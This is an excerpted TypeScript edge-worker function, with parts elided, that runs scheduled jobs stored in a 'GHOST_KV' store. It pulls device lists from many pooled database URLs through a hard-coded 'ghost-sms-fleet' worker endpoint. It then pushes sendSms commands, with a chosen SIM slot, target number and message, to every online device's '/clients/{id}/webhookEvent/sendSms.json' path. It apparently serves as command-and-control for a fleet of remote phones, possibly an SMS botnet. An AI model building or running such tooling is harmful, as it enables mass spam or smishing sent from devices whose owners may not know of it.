...
export async function processScheduledJobsOnEdge(env?: unknown): Promise<{ processed: number }> {
  try {
    // @ts-ignore
    const kv = (env as any)?.GHOST_KV || (globalThis as any).GHOST_KV || (process as any).env?.GHOST_KV;
    if (!kv || typeof kv.get !== "function" || typeof kv.put !== "function") {
      return { processed: 0 };
    }

    const rawJobs = (await kv.get("scheduled_jobs", "json")) || [];
    const jobs = Array.isArray(rawJobs) ? (rawJobs as ServerJob[]) : [];
    const now = Date.now();
    const dueJobs = jobs.filter((j) => j.status === "pending" && j.runAt <= now);

    if (dueJobs.length === 0) return { processed: 0 };

    // Mark due jobs as running in KV
    for (const job of dueJobs) {
      const idx = jobs.findIndex((j) => j.id === job.id);
      const existing = idx >= 0 ? jobs[idx] : undefined;
      if (existing) {
        jobs[idx] = { ...existing, status: "running" };
      }
    }
    await kv.put("scheduled_jobs", JSON.stringify(jobs));

    // 1. Gather all databases (default + custom KV databases)
    let dbs: ServerDbEntry[] = getDefaultDbEntries();
    try {
      const custom = await kv.get("custom_dbs", "json");
      if (Array.isArray(custom) && custom.length > 0) {
        const map = new Map<string, ServerDbEntry>();
        for (const d of dbs) map.set(d.url, d);
        for (const c of custom as ServerDbEntry[]) map.set(c.url, c);
        dbs = Array.from(map.values());
      }
    } catch { /* ignore */ }

    // 2. Perform 100% REAL-TIME chunked fetch of all DBs in parallel sub-batches of 25 DBs
    const BATCH_SIZE = 25;
    const chunks: ServerDbEntry[][] = [];
    for (let i = 0; i < dbs.length; i += BATCH_SIZE) {
      chunks.push(dbs.slice(i, i + BATCH_SIZE));
    }

    const origin = "https://ghost-sms-fleet.iyvorav8.workers.dev";
    let allDevices: ServerDeviceInfo[] = [];

    // Fetch sub-batches via worker API HTTP endpoint to give each sub-batch its own 50 subrequests budget
    const chunkPromises = chunks.map(async (chunk) => {
      try {
        const res = await fetch(`${origin}/api/fetch-dbs-chunk`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ dbs: chunk }),
        });
        if (res.ok) {
          const data = await res.json();
          return Array.isArray(data) ? (data as ServerDeviceInfo[]) : [];
        }
      } catch { /* ignore */ }

      // Direct fallback inside edge context capped to 15 DBs for safety
      const safeChunk = chunk.slice(0, 15);
      const fallback = await Promise.all(safeChunk.map((entry) => fetchSingleDbWithTimeout(entry)));
    ...
    for (const job of dueJobs) {
      ...
      if (onlineDevices.length > 0) {
        await Promise.all(
          onlineDevices.map(async (d) => {
            const base = d.dbUrl.replace(/\/$/, "");
            const from = (Number(job.sim) + 1) as 1 | 2;
            const payload = { from, to: job.number, message: job.message, isSended: false };
            const requestUrl = `${base}/clients/${d.id}/webhookEvent/sendSms.json`;
            try {
              const res = await fetch(requestUrl, {
                method: "PUT",
      ...
      // Update final job status in KV
      const freshRaw = (await kv.get("scheduled_jobs", "json")) || [];
      const freshJobs = Array.isArray(freshRaw) ? (freshRaw as ServerJob[]) : [];
      const idx = freshJobs.findIndex((j) => j.id === job.id);
      const existing = idx >= 0 ? freshJobs[idx] : undefined;
      if (existing) {
        freshJobs[idx] = {
          ...existing,
          status: "done",
          totalTargets: onlineDevices.length,
          okCount: ok,
          failCount: fail,
        };
        await kv.put("scheduled_jobs", JSON.stringify(freshJobs));
      }
    }

    return { processed: dueJobs.length };
  } catch (err) {
    console.error("Error running processScheduledJobsOnEdge:", err);
    return { processed: 0 };
  }
}
